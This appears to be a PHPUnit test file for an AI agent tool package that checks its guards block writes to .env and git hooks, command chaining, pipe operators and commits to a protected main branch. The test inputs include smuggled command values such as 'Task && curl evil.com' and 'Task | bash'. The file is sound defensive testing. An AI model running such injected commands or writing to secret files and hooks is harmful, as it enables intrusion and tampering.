<?php

declare(strict_types=1);

namespace Yousef\LaraOrcest\Tests\Unit;

use PHPUnit\Framework\TestCase;
use RuntimeException;
use Yousef\LaraOrcest\Tools\ArtisanRunnerTool;
use Yousef\LaraOrcest\Tools\GitCommandTool;
use Yousef\LaraOrcest\Tools\PatchWriterTool;
use Yousef\LaraOrcest\Tools\Support\PathGuard;

class SecurityInjectionTest extends TestCase
{
    protected string $tempDir;
    protected PathGuard $guard;

    protected function setUp(): void
    {
        $this->tempDir = sys_get_temp_dir() . '/lara_orcest_inject_test_' . bin2hex(random_bytes(4));
        mkdir($this->tempDir . '/app', 0755, true);
        mkdir($this->tempDir . '/.git', 0755, true);
        file_put_contents($this->tempDir . '/.env', 'SECRET_KEY=supersecret');

        $this->guard = new PathGuard($this->tempDir, ['.env', '.git', 'vendor']);
    }

    protected function tearDown(): void
    {
        $files = new \RecursiveIteratorIterator(
            new \RecursiveDirectoryIterator($this->tempDir, \RecursiveDirectoryIterator::SKIP_DOTS),
            \RecursiveIteratorIterator::CHILD_FIRST
        );
        foreach ($files as $fileinfo) {
            $todo = ($fileinfo->isDir() ? 'rmdir' : 'unlink');
            $todo($fileinfo->getRealPath());
        }
        rmdir($this->tempDir);
    }

    public function test_patch_writer_rejects_writing_to_env(): void
    {
        $this->expectException(RuntimeException::class);
        $this->expectExceptionMessage('Access to denied path pattern');

        $writer = new PatchWriterTool($this->guard);
        $writer->execute([
            'path' => '.env',
            'content' => 'EVIL=1',
        ]);
    }

    public function test_patch_writer_rejects_writing_to_git_hooks(): void
    {
        $this->expectException(RuntimeException::class);
        $this->expectExceptionMessage('Access to denied path pattern');

        $writer = new PatchWriterTool($this->guard);
        $writer->execute([
            'path' => '.git/hooks/pre-commit',
            'content' => '#!/bin/sh',
        ]);
    }

    public function test_artisan_runner_rejects_command_chaining(): void
    {
        $this->expectException(RuntimeException::class);
        $this->expectExceptionMessage('Shell metacharacters');

        $artisan = new ArtisanRunnerTool($this->tempDir, ['make:model']);
        $artisan->execute([
            'command' => 'make:model',
            'arguments' => ['Task && curl evil.com'],
        ]);
    }

    public function test_artisan_runner_rejects_pipe_operators(): void
    {
        $this->expectException(RuntimeException::class);
        $this->expectExceptionMessage('Shell metacharacters');

        $artisan = new ArtisanRunnerTool($this->tempDir, ['make:model']);
        $artisan->execute([
            'command' => 'make:model',
            'arguments' => ['Task | bash'],
        ]);
    }

    public function test_git_tool_rejects_commit_on_protected_main_branch(): void
    {
        $this->expectException(RuntimeException::class);
        $this->expectExceptionMessage('Committing directly to protected branch');

        // Mock current branch as 'main'
        $git = new class($this->tempDir, ['main']) extends GitCommandTool {
            public function getCurrentBranch(): array {
                return ['branch' => 'main', 'dry_run' => false];
            }
        };

        $git->commit('Direct commit to main');
    }
}
